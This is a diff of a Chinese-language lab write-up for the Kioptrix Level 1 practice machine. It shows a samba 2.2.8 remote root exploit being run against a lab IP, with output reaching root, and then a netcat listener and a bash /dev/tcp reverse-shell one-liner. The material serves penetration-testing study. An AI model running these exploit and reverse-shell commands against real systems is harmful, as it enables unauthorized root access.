@@ -111,7 +111,27 @@ Usage: ./fucksamba [-bBcCdfprsStv] [host]
 
 ```
 
+利用远程连接
+```bash
+└─# ./fucksamba -b 0 -v 192.168.199.1  
+samba-2.2.8 < remote root exploit by eSDee (www.netric.org|be)
+--------------------------------------------------------------
++ Verbose mode.
++ Bruteforce mode. (Linux)
++ Host is running samba.
++ Using ret: [0xbffffed4]
++ Using ret: [0xbffffda8]
++ Worked!
+--------------------------------------------------------------
+*** JE MOET JE MUIL HOUWE
+Linux kioptrix.level1 2.4.7-10 #1 Thu Sep 6 16:46:36 EDT 2001 i686 unknown
+uid=0(root) gid=0(root) groups=99(nobody)
 
+```
+nc -lvnp 4444
+bash -i >& /dev/tcp/192.168.199.159/4444 0>&1
+完成回连获取root shell
 
-
+### 额外内容
+除了samba还有mod_ssl/2.8.4的poc
 
